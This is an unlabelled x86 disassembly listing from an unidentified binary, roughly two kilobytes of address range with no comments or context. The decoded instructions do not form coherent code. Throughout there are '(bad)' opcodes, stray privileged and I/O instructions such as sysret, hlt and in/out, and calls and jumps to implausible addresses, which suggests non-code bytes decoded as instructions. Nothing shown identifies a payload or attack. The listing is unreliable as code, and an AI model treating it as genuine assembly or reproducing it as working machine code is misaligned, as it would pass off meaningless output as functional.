  432a6f:	inc    ebp
  432a70:	xor    eax,0x7f80803
  432a75:	dec    ebp
  432a76:	fwait
  432a77:	add    esi,DWORD PTR [edx]
  432a79:	clc    
  432a7a:	cmp    DWORD PTR [ecx],ecx
  432a7c:	or     al,0x8
  432a7e:	add    al,BYTE PTR [ebp+0x2c]
  432a81:	xor    eax,0x7350845
  432a86:	or     BYTE PTR [ebp+0x7],cl
  432a89:	lea    ebx,[ebx-0x748dcdff]
  432a8f:	add    BYTE PTR [eax*2-0x74b21438],cl
  432a96:	mov    edx,DWORD PTR [eax]
  432a98:	cld    
  432a99:	dec    ebp
  432a9a:	push   esp
  432a9b:	sub    edx,DWORD PTR [ecx-0x75]
  432a9e:	add    eax,0xf172fc
  432aa3:	or     BYTE PTR [ebp+0x7],cl
  432aa6:	add    eax,ecx
  432aa8:	or     al,0x72
  432aaa:	add    DWORD PTR [eax],eax
  432aac:	mov    ebx,0x29c2c1
  432ab1:	inc    ebp
  432ab2:	mov    eax,DWORD PTR [ebx]
  432ab4:	cmp    eax,0x3004d1c
  432aba:	xbegin 0x66c8b6b4
  432ac0:	clc    
  432ac1:	or     BYTE PTR [ebp+0x45],al
  432ac4:	xor    dh,BYTE PTR ds:0x78b089c
  432aca:	adc    BYTE PTR [ebp+0x45],cl
  432acd:	lea    eax,[ebp+0x33727501]
  432ad3:	add    cl,ch
  432ad5:	inc    ebp
  432ad6:	add    bl,ch
  432ad8:	add    BYTE PTR [ebx+0x45850845],cl
  432ade:	je     0x432a6b
  432ae0:	push   ebx
  432ae1:	or     al,0x85
  432ae3:	dec    ebp
  432ae4:	std    
  432ae5:	mov    bh,bh
  432ae7:	mov    BYTE PTR [ebp-0x75],al
  432aea:	mov    edi,eax
  432aec:	or     al,0x89
  432aee:	inc    ebp
  432aef:	clc    
  432af0:	mov    esp,esp
  432af2:	hlt    
  432af3:	call   DWORD PTR [edi-0x37]
  432af6:	push   esp
  432af7:	or     al,0x51
  432af9:	push   ebp
  432afa:	xor    ebp,esp
  432afc:	mov    esi,0x457251
  432b01:	xor    esi,eax
  432b03:	pushf  
  432b04:	inc    ebp
  432b05:	(bad)  
  432b06:	mov    edi,eax
  432b08:	or     al,0x85
  432b0a:	add    al,bh
  432b0c:	inc    eax
  432b0e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432b12:	or     ah,bh
  432b14:	inc    eax
  432b15:	push   esp
  432b16:	jmp    0x432b69
  432b18:	mov    eax,DWORD PTR ds:0xe8720c
  432b1e:	mov    DWORD PTR [ebp-0x8],eax
  432b21:	jne    0x432b68
  432b23:	jmp    0x432ab0
  432b25:	mov    ebp,DWORD PTR [eax]
  432b27:	clc    
  432b28:	retf   0xff54
  432b2b:	push   ecx
  432b2c:	mov    DWORD PTR ds:0x757210,eax
  432b32:	mov    ecx,DWORD PTR [ebp-0x4]
  432b35:	sub    esp,DWORD PTR [ebx-0x77]
  432b38:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432b3f:	or     ah,bh
  432b41:	pop    es
  432b42:	ds fwait
  432b44:	push   DWORD PTR [edx]
  432b46:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  432b4c:	(bad)  
  432b4d:	mov    bh,bh
  432b4f:	jmp    0x432b3d
  432b51:	leave  
  432b52:	jne    0x432b5c
  432b54:	call   0x3024ae
  432b59:	in     al,dx
  432b5a:	dec    ebp
  432b5b:	add    dh,BYTE PTR [ebx]
  432b5d:	add    BYTE PTR [ebx],al
  432b5f:	inc    ebp
  432b60:	cmp    esi,DWORD PTR [ecx]
  432b62:	je     0x432b00
  432b64:	mov    eax,edi
  432b66:	or     al,0xf0
  432b68:	add    BYTE PTR [ebp+0x458bf845],al
  432b6e:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432b74:	adc    al,0x7
  432b76:	enter  0x9fc0,0xa5
  432b7a:	rol    BYTE PTR [eax],0x5e
  432b7d:	mov    ecx,ecx
  432b7f:	or     al,0xc
  432b81:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432b88:	jmp    0x432b89
  432b8a:	push   ebp
  432b8b:	mov    esp,ebp
  432b8d:	cld    
  432b8e:	inc    ebp
  432b8f:	inc    ebp
  432b90:	or     DWORD PTR [ecx+0x457dec10],0x0
  432b97:	push   esi
  432b98:	push   esi
  432b99:	mov    edi,0x7af080f
  432b9e:	add    bh,al
  432ba0:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432ba6:	add    BYTE PTR [ecx+0x4540100f],cl
  432bac:	mov    ebp,eax
  432bae:	mov    ebp,edi
  432bb0:	lock call edx
  432bb3:	fcom   DWORD PTR [ebp+0x45]
  432bb6:	mov    eax,0x148a8b
  432bbb:	push   ecx
  432bbc:	enter  0xc145,0x83
  432bc0:	cmp    ecx,DWORD PTR [eax]
  432bc2:	add    BYTE PTR [ebp+0x4d],al
  432bc5:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432bcb:	call   0xffa3273a
  432bd0:	cmp    eax,DWORD PTR [ebp-0xc]
  432bd3:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432bd7:	push   ebp
  432bd8:	(bad)  
  432bd9:	call   0x3429dd
  432bde:	mov    bh,0xdb
  432be0:	cld    
  432be1:	or     BYTE PTR [ebp+0x45],bl
  432be4:	(bad)  
  432be5:	call   0xff7d2875
  432bea:	add    al,BYTE PTR [ebp+0x37]
  432bed:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432bf3:	jne    0x432bf5
  432bf5:	(bad)  
  432bf6:	cmp    edi,esp
  432bf8:	jne    0x432c2b
  432bfa:	mov    edi,edi
  432bfc:	or     BYTE PTR [ebx-0x307f0b49],cl
  432c02:	pop    ds
  432c03:	into   
  432c04:	je     0x432bc7
  432c06:	mov    ebx,DWORD PTR [esi]
  432c08:	or     BYTE PTR [ebp-0x49],al
  432c0b:	mov    esp,DWORD PTR [esi-0x77]
  432c0e:	mov    esi,0x2451f0c
  432c13:	mov    eax,DWORD PTR [eax]
  432c15:	or     al,0x66
  432c17:	sar    bl,0x3b
  432c1a:	xor    esi,DWORD PTR [ebp+0x66]
  432c1d:	xor    ecx,edi
  432c1f:	pop    edi
  432c20:	adc    bl,BYTE PTR [ebx+0x7e]
  432c23:	ret    0xff
  432c26:	cld    
  432c27:	inc    ebp
  432c28:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432c2e:	cld    
  432c2f:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432c36:	push   0xffffff83
  432c38:	pop    edi
  432c39:	or     BYTE PTR [ebp+0x53],dh
  432c3c:	xorps  xmm1,xmm2
  432c3f:	test   BYTE PTR [eax+eax*1],bh
  432c42:	add    BYTE PTR [eax],al
  432c44:	adc    eax,eax
  432c46:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432c4e:	jmp    DWORD PTR [eax]
  432c50:	ror    al,0x5e
  432c53:	inc    ebp
  432c54:	leave  
  432c55:	xor    ecx,DWORD PTR [eax]
  432c57:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432c5d:	add    ah,al
  432c5f:	xor    edi,edi
  432c61:	xor    DWORD PTR [ebx],0x66003302
  432c67:	mov    DWORD PTR [ebp-0xc],ecx
  432c6a:	pcmpgtw mm0,mm0
  432c6d:	add    dl,ah
  432c6f:	leave  
  432c70:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432c74:	push   eax
  432c75:	dec    ebp
  432c76:	mov    esi,DWORD PTR [ebx-0x75]
  432c79:	lea    ebp,[eax-0x7c00ff02]
  432c7f:	xor    eax,DWORD PTR [eax]
  432c81:	sysret 
  432c83:	dec    ebp
  432c84:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432c8b:	push   WORD PTR [ecx+0x8]
  432c8f:	jne    0x432c52
  432c91:	ud0    ecx,DWORD PTR [ecx]
  432c94:	mov    eax,edx
  432c96:	lods   al,BYTE PTR ds:[esi]
  432c97:	add    BYTE PTR [eax],al
  432c99:	data16 (bad) 
  432c9b:	iret   
  432c9c:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432ca3:	cli    
  432ca4:	inc    ebp
  432ca5:	cmp    al,0x8d
  432ca7:	add    BYTE PTR [esi+0x2d],ah
  432caa:	inc    ebp
  432cab:	pop    ebp
  432cac:	lea    ecx,[edi]
  432cae:	mov    dl,bh
  432cb0:	add    BYTE PTR [edi],cl
  432cb2:	mov    DWORD PTR [eax+eax*8],edi
  432cb5:	mov    ebx,0x3b87
  432cba:	add    BYTE PTR [ebx],ch
  432cbc:	inc    ebp
  432cbd:	data16 (bad) 
  432cbf:	clc    
  432cc0:	int3   
  432cc1:	cmp    eax,DWORD PTR [eax]
  432cc3:	je     0x432c4e
  432cc5:	push   0xffffffc8
  432cc7:	pop    edi
  432cc8:	xchg   DWORD PTR [ebp+0x0],eax
  432ccb:	data16 add BYTE PTR [ebp+0x45],cl
  432ccf:	lea    cx,[ebp+0x10]
  432cd3:	jb     0x432cd5
  432cd5:	jmp    0x432c60
  432cd7:	call   eax
  432cd9:	clc    
  432cda:	xchg   DWORD PTR [edi+0x1],edi
  432cdd:	mov    eax,DWORD PTR [eax]
  432cdf:	or     BYTE PTR [ebp-0x49],al
  432ce2:	lea    eax,[eax+0x74003154]
  432ce8:	push   edi
  432ce9:	inc    edx
  432cea:	jge    0x432ceb
  432cec:	mov    DWORD PTR [edi],ecx
  432cee:	fdiv   DWORD PTR [edi-0x6]
  432cf1:	inc    DWORD PTR [eax]
  432cf3:	xor    edx,DWORD PTR [eax+0x5f]
  432cf6:	xchg   DWORD PTR [ebx+0x1],ebx
  432cf9:	ret    0x0
  432cfc:	xor    BYTE PTR [ebp-0x51],cl
  432cff:	cmp    edi,0xf0ff89fe
  432d05:	data16 ror al,0x84
  432d09:	rol    BYTE PTR [eax],0x3b
  432d0c:	add    al,dh
  432d0e:	dec    eax
  432d0f:	xchg   esp,eax
  432d10:	push   ebx
  432d11:	jmp    0x432c9e
  432d13:	push   ebp
  432d14:	add    esp,ebp
  432d16:	add    ebp,esp
  432d18:	mov    edx,DWORD PTR [edi+0x24]
  432d1b:	clc    
  432d1c:	dec    esi
  432d1d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432d23:	cmp    BYTE PTR [ebx],al
  432d25:	jne    0x432cb0
  432d27:	xor    esp,eax
  432d29:	jmp    0x462eac
  432d2e:	add    ebp,DWORD PTR [ecx+ecx*4]
  432d31:	jne    0x432d27
  432d33:	call   0xffcd2a8d
  432d38:	clc    
  432d39:	xchg   edi,eax
  432d3a:	sti    
  432d3b:	add    DWORD PTR [ebx],eax
  432d3d:	add    BYTE PTR [ebp+0x47],bl
  432d40:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432d46:	pop    ebp
  432d47:	mov    DWORD PTR [esi-0x48],esi
  432d4a:	jmp    0x432d93
  432d4c:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432d52:	(bad)  
  432d54:	cmp    al,0x0
  432d56:	cmp    eax,DWORD PTR [ebp+0x18]
  432d59:	lea    ebx,[ebp-0x56]
  432d5c:	jle    0x432d5e
  432d5e:	jae    0x432ce9
  432d60:	mov    eax,esp
  432d62:	call   0xb900:0x8b005587
  432d69:	inc    ebp
  432d6a:	push   ebp
  432d6b:	lea    ecx,[ebp-0x27ff4f12]
  432d71:	mov    eax,edi
  432d73:	int3   
  432d74:	push   ebp
  432d75:	xchg   edi,eax
  432d77:	add    esp,ebp
  432d79:	add    BYTE PTR [eax],al
  432d7b:	inc    ebp
  432d7c:	add    BYTE PTR [ebp+0x8b3255],cl
  432d82:	cld    
  432d83:	mov    DWORD PTR [edx],edi
  432d85:	aam    0x75
  432d87:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432d8d:	mov    DWORD PTR [ebx-0x50],edx
  432d90:	test   BYTE PTR [ebp-0x1],0xe8
  432d94:	mov    eax,DWORD PTR [eax]
  432d96:	hlt    
  432d97:	add    al,al
  432d99:	mov    eax,DWORD PTR ds:0x890045a8
  432d9f:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432da5:	inc    DWORD PTR [eax*2+0xf75854d]
  432dac:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432db2:	call   0x72998af3
  432db7:	je     0x432e17
  432db9:	js     0x432e1a
  432dbb:	lock ret 0x7e
  432dbf:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432dc5:	mov    edi,edi
  432dc7:	sbb    al,bl
  432dc9:	clc    
  432dca:	add    BYTE PTR [ebp-0x73],bh
  432dcd:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432dd3:	ror    BYTE PTR [eax],1
  432dd5:	dec    ebp
  432dd6:	xchg   ebp,eax
  432dd7:	mov    edi,edi
  432dd9:	in     al,0x8b
  432ddb:	jge    0x432d66
  432ddd:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432de3:	clc    
  432de4:	pop    esi
  432de5:	fist   DWORD PTR [ebp+0x5d398b5d]
  432deb:	clc    
  432dec:	add    al,0x6e
  432dee:	mov    eax,DWORD PTR [ebx]
  432df0:	mov    BYTE PTR [ebp+0x0],dl
  432df3:	mov    edx,DWORD PTR [ebx-0x20]
  432df6:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432dfc:	add    eax,0x3b3b73
  432e01:	adc    al,0x89
  432e03:	pop    eax
  432e04:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432e08:	ret    0xf08
  432e0b:	cmp    al,0x2
  432e0d:	mov    edx,eax
  432e0f:	cld    
  432e10:	add    BYTE PTR [ebp+0x66],dl
  432e13:	add    eax,ebx
  432e15:	add    esp,eax
  432e17:	sub    eax,eax
  432e19:	or     BYTE PTR [ecx-0x77f474bb],cl
  432e1f:	add    BYTE PTR [eax],al
  432e21:	mov    DWORD PTR [ebx-0x24],ebx
  432e24:	push   edi
  432e25:	push   ebp
  432e26:	clc    
  432e27:	add    DWORD PTR [esi+0x1b0100],0x45
  432e2e:	out    0xff,eax
  432e30:	add    edx,DWORD PTR [eax]
  432e32:	jmp    0x432e1c
  432e34:	cmp    ch,0x46
  432e37:	(bad)  
  432e38:	jmp    0x40c8b68a
  432e3d:	je     0x432dc9
  432e3f:	mov    eax,DWORD PTR [eax-0x10c78104]
  432e45:	inc    ebp
  432e46:	add    BYTE PTR [ebx-0x770375],al
  432e4c:	add    ah,ch
  432e4e:	add    edx,esp
  432e50:	pop    edi
  432e51:	pop    ebp
  432e52:	push   ebp
  432e53:	inc    ebx
  432e54:	in     al,dx
  432e55:	pop    ebp
  432e56:	in     al,dx
  432e57:	cmp    edx,DWORD PTR [edi-0x8]
  432e5a:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432e61:	add    al,0x47
  432e63:	push   ebp
  432e64:	mov    esp,ebp
  432e66:	in     al,0x45
  432e68:	dec    ebp
  432e69:	push   esi
  432e6a:	test   DWORD PTR [eax+0xfb010f],esi
  432e70:	add    BYTE PTR [eax+0xc018b],dh
  432e76:	leave  
  432e77:	inc    ebp
  432e78:	test   al,ch
  432e7a:	add    dh,bh
  432e7c:	add    bh,bh
  432e7e:	dec    ebp
  432e7f:	push   cs
  432e80:	mov    DWORD PTR [ecx],eax
  432e82:	hlt    
  432e83:	push   es
  432e84:	dec    ebp
  432e85:	leave  
  432e86:	mov    DWORD PTR [eax],ecx
  432e88:	clc    
  432e89:	cmovge eax,ecx
  432e8c:	mov    ecx,0x85c2f0
  432e92:	clc    
  432e93:	pop    DWORD PTR [ebp+0x1]
  432e96:	push   ebx
  432e97:	add    BYTE PTR [ebp-0x15],bh
  432e9a:	push   esi
  432e9b:	xor    eax,0x898a45
  432ea0:	cld    
  432ea1:	add    al,BYTE PTR [ebp+0x0]
  432ea4:	xor    esp,DWORD PTR [esi-0x64]
  432ea7:	add    DWORD PTR [esi+0x78308c1],edi
  432ead:	add    ah,BYTE PTR [ebp-0x49]
  432eb0:	int    0xbb
  432eb2:	mov    ecx,DWORD PTR [esi+0xc]
  432eb5:	add    dh,al
  432eb7:	cmp    ecx,ebx
  432eb9:	jne    0x432e83
  432ebb:	xor    ecx,DWORD PTR [ebp+0x66]
  432ebe:	jmp    0xca2ec4
  432ec3:	add    DWORD PTR [ebp+0x0],eax
  432ec6:	mov    eax,ebx
  432ec8:	or     al,0x8b
  432eca:	(bad)  
  432ecb:	mov    ecx,esi
  432ecd:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432ed4:	mov    eax,edi
  432ed6:	or     BYTE PTR [edx],cl
  432ed8:	shl    cl,cl
  432eda:	icebp  
  432edb:	add    BYTE PTR [ebp+0x38],0x8b
  432edf:	or     BYTE PTR [edx+eax*2],cl
  432ee2:	(bad)  
  432ee3:	or     cl,dh
  432ee5:	stc    
  432ee6:	shl    DWORD PTR [ebp-0x30],0xc6
  432eea:	xor    al,0x0
  432eec:	inc    ebp
  432eed:	xchg   BYTE PTR [ebx],al
  432eef:	add    esp,edi
  432ef1:	add    BYTE PTR [ebp-0x39],cl
  432ef4:	mov    al,bl
  432ef6:	test   DWORD PTR [ebx+0x1c348375],ecx
  432efc:	sub    al,0xbf
  432efe:	jmp    0x432e85
  432f00:	mov    edi,eax
  432f02:	lock jge 0x432ef6
  432f05:	lea    esi,[edx-0x74bad5ff]
  432f0b:	mov    ebp,esp
  432f0d:	or     cl,dh
  432f0f:	leave  
  432f10:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432f17:	dec    ebp
  432f18:	dec    ebp
  432f19:	test   DWORD PTR [ebx],eax
  432f1b:	paddb  mm6,mm0
  432f1e:	add    DWORD PTR [eax],eax
  432f20:	dec    ebp
  432f21:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432f27:	mov    esi,DWORD PTR [edx]
  432f29:	or     al,0x2b
  432f2b:	dec    ebp
  432f2c:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432f32:	mov    esp,edi
  432f34:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432f3b:	mov    DWORD PTR [ebx],ebp
  432f3d:	call   0xc76b86d
  432f42:	mov    DWORD PTR [ebp+0x10],ecx
  432f45:	(bad)  
  432f46:	push   0x8b85ff10
  432f4b:	clc    
  432f4c:	or     al,0x54
  432f4e:	(bad)  
  432f4f:	push   ecx
  432f50:	retf   
  432f51:	mov    ebx,0xff4d8dc8
  432f56:	mov    DWORD PTR [ebp+0x8],eax
  432f59:	xor    eax,DWORD PTR [ebp-0x75]
  432f5c:	cmp    ebp,DWORD PTR [ebx]
  432f5e:	lsl    ebx,WORD PTR [edi-0x8]
  432f62:	call   DWORD PTR [ebx-0x741bff75]
  432f68:	(bad)  
  432f69:	or     al,0x5b
  432f6b:	dec    ebp
  432f6c:	or     BYTE PTR [ebx],dh
  432f6e:	inc    ebp
  432f6f:	xor    esi,DWORD PTR ds:0x708088d
  432f75:	in     eax,0x9b
  432f77:	add    BYTE PTR [edx],dh
  432f79:	inc    ebp
  432f7a:	pop    edi
  432f7b:	xor    eax,edx
  432f7d:	test   DWORD PTR [eax],0x81108b8b
  432f83:	dec    ebp
  432f84:	sub    al,0x33
  432f86:	add    BYTE PTR [ebx],dh
  432f88:	push   esi
  432f89:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432f8f:	mov    edi,eax
  432f91:	or     BYTE PTR [ebp+0x45],al
  432f94:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432f9a:	xor    ecx,ecx
  432f9c:	pushf  
  432f9d:	push   es
  432f9e:	mov    DWORD PTR [esi-0x4],0xf8178538
  432fa5:	dec    ebp
  432fa6:	inc    ebp
  432fa7:	cmp    BYTE PTR [ecx],0x54
  432faa:	pushf  
  432fab:	gs (bad) 
  432fad:	shl    esp,1
  432faf:	dec    ebp
  432fb0:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432fb6:	shr    ecx,1
  432fb8:	xlat   BYTE PTR ds:[ebx]
  432fb9:	rol    bh,cl
  432fbb:	mov    edx,esp
  432fbd:	or     BYTE PTR [ebp+0x4588f84d],al
  432fc3:	mov    ecx,DWORD PTR [eax]
  432fc5:	or     BYTE PTR [eax],al
  432fc7:	push   ebp
  432fc8:	mov    edi,DWORD PTR [eax+0xfc728b]
  432fce:	dec    ebp
  432fcf:	enter  0xceba,0x8
  432fd3:	retf   0x1807
  432fd6:	ret    0x9b4d
  432fd9:	mov    esi,DWORD PTR [edx]
  432fdb:	or     al,0x33
  432fdd:	into   
  432fde:	add    edx,esi
  432fe0:	add    ecx,edx
  432fe2:	bswap  eax
  432fe4:	ror    esi,0x98
  432fe7:	dec    ebp
  432fe8:	add    cl,ch
  432fea:	mov    edi,edi
  432fec:	hlt    
  432fed:	inc    esi
  432fef:	inc    ebp
  432ff0:	ret    0x4533
  432ff3:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432ff9:	or     BYTE PTR [ebx],dh
  432ffb:	dec    ebp
  432ffc:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  433002:	jne    0xff8d2fc9
  433008:	inc    ebp
  433009:	inc    ebp
  43300a:	mov    esi,DWORD PTR [ebx]
  43300c:	clc    
  43300d:	pop    esi
  43300e:	ret    0xcaeb
  433011:	mov    eax,esi
  433013:	call   0x520484e6
  433018:	dec    ebp
  433019:	add    eax,0xf8728b
  43301e:	adc    eax,0xce0ccac9
  433023:	push   ebp
  433024:	ret    0xc6ec
  433027:	in     al,dx
  433028:	call   0x33437d31
  43302d:	push   edi
  43302e:	add    edi,eax
  433030:	xor    eax,eax
  433032:	jmp    0x433079
  433034:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  43303a:	add    eax,edi
  43303c:	shr    eax,cl
  43303e:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  433044:	mov    esi,DWORD PTR [edx]
  433046:	in     al,dx
  433047:	pushf  
  433048:	ret    0x84c7
  43304b:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  433051:	inc    ebp
  433052:	in     al,dx
  433053:	xor    DWORD PTR [ebp-0x64],eax
  433056:	mov    eax,edi
  433058:	cld    
  433059:	fmul   st(2),st
  43305b:	sbb    dl,al
  43305d:	jmp    0x9c3b:0x304d45c1
  433064:	jbe    0x43302d
  433066:	mov    esp,eax
  433068:	clc    
  433069:	add    BYTE PTR [ebp+0x0],cl
  43306c:	mov    ecx,ecx
  43306e:	lea    eax,[ebp-0x5]
  433071:	mov    edi,edi
  433073:	call   0x51ce84bd
  433078:	hlt    
  433079:	xor    eax,edx
  43307b:	mov    esi,0x9b7284
  433080:	xor    cl,dl
  433082:	mov    esi,eax
  433084:	hlt    
  433085:	into   
  433086:	inc    ebp
  433087:	scas   eax,DWORD PTR es:[edi]
  433088:	mov    ebp,ecx
  43308a:	cld    
  43308b:	add    dl,cl
  43308d:	add    dl,al
  43308f:	inc    ebp
  433090:	shr    DWORD PTR [ebx],0x4d
  433093:	xor    edi,DWORD PTR [ebx]
  433095:	mov    DWORD PTR [edi],ecx
  433097:	clc    
  433098:	dec    esi
  433099:	inc    ebp
  43309a:	dec    DWORD PTR [ebx-0x3d2b1775]
  4330a0:	ret    0xc6ca
  4330a3:	mov    BYTE PTR [ebp-0x32],0x53
  4330a7:	scas   eax,DWORD PTR es:[edi]
  4330a8:	inc    ebp
  4330a9:	jmp    0x4330db
  4330ab:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  4330b2:	pop    ebx
  4330b3:	xor    ecx,DWORD PTR [ebp+0x3]
  4330b6:	mov    eax,DWORD PTR [ebx]
  4330b8:	clc    
  4330b9:	test   edx,ecx
  4330bb:	mov    ecx,esi
  4330bd:	cld    
  4330be:	call   0x8ab77608
  4330c3:	xor    ecx,DWORD PTR [eax+0x4533f303]
  4330c9:	add    ecx,DWORD PTR [ebx-0x4974072d]
  4330cf:	fdiv   QWORD PTR [ebx]
  4330d1:	retf   0xce89
  4330d4:	in     al,0xc1
  4330d6:	inc    ebp
  4330d7:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  4330dd:	into   
  4330de:	mov    dh,0xc1
  4330e1:	call   0x8c17766a
  4330e6:	(bad)  
  4330e7:	cld    
  4330e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4330eb:	xor    eax,ecx
  4330ed:	lea    eax,[ebp+0x8]
  4330f0:	mov    esi,DWORD PTR [edx-0x4]
  4330f3:	add    dl,al
  4330f5:	inc    ebp
  4330f6:	mov    esp,0x32d89b8b
  4330fb:	dec    ebp
  4330fc:	mov    esi,DWORD PTR [ebx]
  4330fe:	cld    
  4330ff:	xor    eax,edx
  433101:	sub    esp,DWORD PTR [ebp-0x75]
  433104:	int    0xec
  433106:	sub    ecx,eax
  433108:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  43310e:	mov    esi,esp
  433110:	call   0x34177e99
  433115:	inc    DWORD PTR [ebx]
  433117:	mov    edi,DWORD PTR [ebx]
  433119:	cld    
  43311a:	jne    0x433169
  43311c:	mov    esi,DWORD PTR [ebx]
  43311e:	aam    0x8d
  433120:	dec    ebp
  433121:	or     BYTE PTR [ebx],dh
  433123:	jb     0x433128
  433125:	add    BYTE PTR [edi+0x45],bl
  433128:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  43312f:	xor    ebp,esp
  433131:	xor    eax,edi
  433133:	sub    edi,esp
  433135:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  43313b:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  433142:	inc    ebp
  433143:	xor    ecx,DWORD PTR [ecx+0x45891403]
  433149:	clc    
  43314a:	mov    eax,edi
  43314c:	nop
  43314d:	fadd   QWORD PTR [eax]
  43314f:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  433155:	jmp    0x4330e0
  433157:	mov    eax,DWORD PTR [ecx]
  433159:	fadd   DWORD PTR [eax]
  43315b:	inc    ebp
  43315c:	or     DWORD PTR [ebx],esi
  43315e:	dec    eax
  43315f:	add    edx,DWORD PTR [ebx-0x2d]
  433162:	dec    ebp
  433163:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  433169:	inc    ebp
  43316a:	push   esp
  43316b:	mov    dl,BYTE PTR [ecx-0xd]
  43316e:	xor    ecx,DWORD PTR [ebp-0x45]
  433171:	(bad)  
  433173:	rol    BYTE PTR [eax],0xc1
  433176:	ret    
  433177:	inc    ebp
  433178:	inc    ebp
  433179:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  43317f:	xor    eax,ebx
  433181:	add    eax,DWORD PTR [ebp+0x23]
  433184:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43318a:	cmp    edi,0xc
  43318d:	dec    ebp
  43318e:	inc    ebp
  43318f:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433195:	inc    ebp
  433196:	mov    esi,DWORD PTR [ebx]
  433198:	clc    
  433199:	lea    eax,[ebp+0x45725407]
  43319f:	add    BYTE PTR [ebp+eax*2-0x75],dh
  4331a3:	xor    edi,DWORD PTR [eax]
  4331a5:	mov    ecx,0xff8b8d4d
  4331aa:	push   esp
  4331ab:	enter  0x4df7,0x23
  4331af:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  4331b5:	mov    eax,DWORD PTR [ebx]
  4331b7:	loopne 0x4331a4
  4331b9:	ret    0xc68b
  4331bc:	push   esp
  4331bd:	enter  0x9745,0x8b
  4331c1:	inc    ebp
  4331c2:	cld    
  4331c3:	mov    eax,edi
  4331c5:	clc    
  4331c6:	ret    
  4331c7:	ret    0xc645
  4331ca:	mov    esi,DWORD PTR [ebx]
  4331cc:	cld    
  4331cd:	pop    esi
  4331ce:	mov    ebx,0x83458bc3
  4331d4:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  4331d8:	dec    ebp
  4331d9:	xor    DWORD PTR [ebx],esi
  4331db:	pushf  
  4331dc:	add    edi,DWORD PTR [edx-0x7767a77]
  4331e2:	fcom   DWORD PTR [ebp+0x45]
  4331e5:	mov    esi,DWORD PTR [ebx]
  4331e7:	adc    al,0x9c
  4331e9:	inc    ebp
  4331ea:	(bad)  
  4331eb:	mov    ebx,eax
  4331ed:	adc    al,0x85
  4331ef:	cmp    al,0x1
  4331f2:	inc    ebp
  4331f3:	add    BYTE PTR ds:0xe98b9c4d,bh
  4331f9:	mov    eax,DWORD PTR [ebx]
  4331fb:	nop
  4331fc:	add    BYTE PTR [eax],al
  4331fe:	inc    ebp
  4331ff:	mov    esi,DWORD PTR [ebx]
  433201:	add    eax,DWORD PTR [ebx]
  433203:	cmp    al,0x89
  433205:	mov    esp,esi
  433207:	clc    
  433208:	inc    ebp
  433209:	inc    ebp
  43320a:	add    edx,DWORD PTR [esi+0xc]
  43320d:	mov    edi,0x7ff0845
  433212:	in     al,dx
  433213:	(bad)  
  433214:	jne    0x4331b1
  433216:	mov    esi,DWORD PTR [edx]
  433218:	clc    
  433219:	add    ebp,DWORD PTR [esi]
  43321b:	mov    edi,edi
  43321d:	in     al,dx
  43321e:	mov    DWORD PTR [ebp-0x10],eax
  433221:	xor    eax,DWORD PTR [ebp+0x3]
  433224:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  43322a:	fmul   DWORD PTR [ebx-0x173caf39]
  433230:	lea    ecx,[ecx+0x45e8d4bc]
  433236:	clc    
  433237:	mov    edi,edi
  433239:	cmp    BYTE PTR [ebp+0x4d],al
  43323c:	test   DWORD PTR [eax+0x74],ecx
  43323f:	inc    ecx
  433240:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  433246:	ret    
  433247:	inc    eax
  433248:	dec    DWORD PTR [ebx+0x4945f8f0]
  43324e:	push   eax
  43324f:	dec    eax
  433250:	test   al,0xd0
  433252:	dec    eax
  433254:	mov    eax,DWORD PTR [ebp-0x14]
